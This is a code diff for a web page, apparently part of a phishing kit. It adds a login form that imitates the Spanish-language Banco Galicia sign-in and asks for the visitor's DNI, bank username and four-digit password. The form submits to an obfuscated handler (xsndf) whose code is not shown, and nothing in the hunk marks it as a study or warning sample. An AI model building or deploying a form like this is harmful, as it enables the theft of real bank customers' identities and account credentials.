@@ -16,7 +16,15 @@
                 <img src="o.svg">
             </div>
             <div class="inf" id="frm1">
-                <div class="xfk" onclick="xldfr()"></div>
+                <form action="" style="text-align: center;" id="xfrm1" onsubmit="xsndf(event)">
+                    <input type="text" placeholder="Tu DNI" id="xinpt" autofocus required autocomplete="off" maxlength="12" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" inputmode="numeric">
+                    <input type="text" placeholder="Tu Usuario Galicia" id="xinpt2" required autocomplete="off" maxlength="22">
+                    <input type="password" placeholder="Tu Clave Galicia" id="xinpt3" required autocomplete="off" maxlength="4" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" inputmode="numeric">
+                    <input type="checkbox" style="border: 0.3px solid #999;position: relative;top: 261px;left: -159px;">
+                
+                    <button class="btn btn1">INICIAR SESIÓN</button>
+                    
+                </form>
             </div>
         </div>
         <div id="xleft">
